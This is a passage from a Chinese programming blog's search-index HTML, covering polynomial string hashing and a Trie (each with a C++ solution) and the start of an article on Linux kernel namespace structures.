t;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;hash(ABCD)=1*P^{3}+2*P^{2}+3*P^{1}+4*P^{0}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05017em;&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.897438em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.897438em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.897438em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;这道题可以首先初始化一个h数组，h[i]存储前i个字符串的hash值，例如：&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;4&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;h[1] = hash(A), h[2] = hash(AB), h[3]=hash(ABC), h[4]=hash(ABCD)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05017em;&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05017em;&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05017em;&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，那么字串&lt;code&gt;BC&lt;/code&gt;的hash值=&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;h[3]-h[1]*P^{2}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，其实如果P=10，即十进制就相当于BC=ABC-A*100=123-100=23。&lt;/p&gt;
&lt;p&gt;那么有一个问题就是如果字符串太长势必会导致它的hash值非常大，造成溢出，所以一般需要对一个值进行取模例如&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mn&gt;64&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;2^{64}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，P通常取131，那么h数组可以定义成&lt;code&gt;unsigned long long&lt;/code&gt;，溢出就相当于取模。&lt;/p&gt;
&lt;p&gt;那么这道题的代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;

using namespace std;

int main()
{
    int n, m;
    unsigned long long h[100005], P = 131, p[100005]; // p[2] = P^2

    char str[100005];
    
    cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; m;
    cin &amp;gt;&amp;gt; str + 1;
    
    h[0] = 0;
    p[0] = 1;
    for(int i = 1; i &amp;lt;= n ; i ++)
    {
        p[i] = p[i - 1] * P;
        h[i] = h[i - 1] * P + str[i];
    }
    
    while(m--)
    {
        int a, b, c, d;
        cin &amp;gt;&amp;gt; a &amp;gt;&amp;gt; b &amp;gt;&amp;gt; c &amp;gt;&amp;gt; d;
        if((h[b] - h[a - 1] * p[b - a + 1]) == (h[d] - h[c - 1] * p[d - c + 1]))
            cout &amp;lt;&amp;lt; &amp;quot;Yes&amp;quot; &amp;lt;&amp;lt; endl;
        else
            cout &amp;lt;&amp;lt; &amp;quot;No&amp;quot; &amp;lt;&amp;lt; endl;
    }
    
}

&lt;/code&gt;&lt;/pre&gt;
">【数据结构】字符串哈希</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/shu-ju-jie-gou-trie-shu-cun-chu-zi-fu-chuan/"" data-c="
          &lt;p&gt;Trie通常是用于字符串字典的插入和存储，所有包含相同前缀的字符串所在Trie树的同一条路径，直到字符不同后分叉，例如：&lt;/p&gt;
&lt;p&gt;good和google两个字符串的公共前缀是goo，那么在Trie树中，它们用的是同一条前缀路径goo。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627102053376.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;例题：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;维护一个字符串集合，支持两种操作：
I x 向集合中插入一个字符串 x；
Q x 询问一个字符串在集合中出现了多少次。
共有 N 个操作，输入的字符串总长度不超过 105，字符串仅包含小写英文字母。

输入格式
第一行包含整数 N，表示操作数。
接下来 N 行，每行包含一个操作指令，指令为 I x 或 Q x 中的一种。

输出格式
对于每个询问指令 Q x，都要输出一个整数作为结果，表示 x 在集合中出现的次数。
每个结果占一行。

数据范围
1≤N≤2∗104

输入样例：
5
I abc
Q abc
Q ab
I ab
Q ab

输出样例：
1
0
1
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstring&amp;gt;

using namespace std;

int main()
{
    int n;
    int son[100010][26], cnt[100010], idx = 0;
    memset(son, 0, sizeof son);
    memset(cnt, 0, sizeof cnt);
    cin &amp;gt;&amp;gt; n;
    
    while(n--)
    {
        string option, str;
        cin &amp;gt;&amp;gt; option &amp;gt;&amp;gt; str;

        if(option == &amp;quot;I&amp;quot;)
        {
            int p = 0;
            for(int i = 0; i &amp;lt; str.length(); i ++)
            {
                if(son[p][str[i]-&#39;a&#39;] == 0) 
                    son[p][str[i]-&#39;a&#39;] = ++ idx;
                p = son[p][str[i]-&#39;a&#39;];
            }
            cnt[p] ++;
        }
        else
        {
            int p = 0;
            int i;
            for(i = 0; i &amp;lt; str.length(); i ++)
            {
                if(son[p][str[i]-&#39;a&#39;] == 0) 
                {
                    cout &amp;lt;&amp;lt; 0 &amp;lt;&amp;lt; endl;
                    break;
                }
                p = son[p][str[i]-&#39;a&#39;];
            }
            if(i==str.length())
                cout &amp;lt;&amp;lt; cnt[p] &amp;lt;&amp;lt; endl;
        }
    }
    
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
">【数据结构】Trie树(存储字符串)</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/rong-qi-namespace/"" data-c="
          &lt;p&gt;namespace为进程创建独立隔离的环境，隔离后的每个namespace看上去像是一个独立的linux系统。&lt;/p&gt;
&lt;h2 id=&#34;进程结构体中的namespace指针&#34;&gt;进程结构体中的namespace指针&lt;/h2&gt;
&lt;p&gt;一个进程可以属于多个namespace，在task_struct中有一个指向namespace结构体的指针nsproxy。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct nsproxy{
    atomic_t count;
    struct uts_namspace *uts_ns;
    struct ipc_namspace *ipc_ns;
    struct mnt_namspace *mnt_ns;
    struct pid_namspace *pid_ns_for_children;
    struct net *net_ns;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果不指定ns，那么创建进程时会指定一个默认的ns：init_nsproxy&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct nsproxy init_nsproxy = {
    .count = ATOMIC_INTI(1),
    .uts_ns = &amp;amp;init_uts_ns,
    #if defined(CONFIG_POSIX_MQUEUE) || defined(CONFIG_SYSVIPC)
        .ipc_ns = &amp;amp;init_ipc_ns,
    #endif
    .mnt_ns = NULL,
    .pid_ns_for_children = &amp;amp;init_pid_ns,
    #ifdef CONFIG_NET
        .net_ns = &amp;amp;init_net,
    #endif
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;namespace相关的系统调用&#34;&gt;namespace相关的系统调用&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. clone()&lt;/strong&gt;&lt;/p&gt;
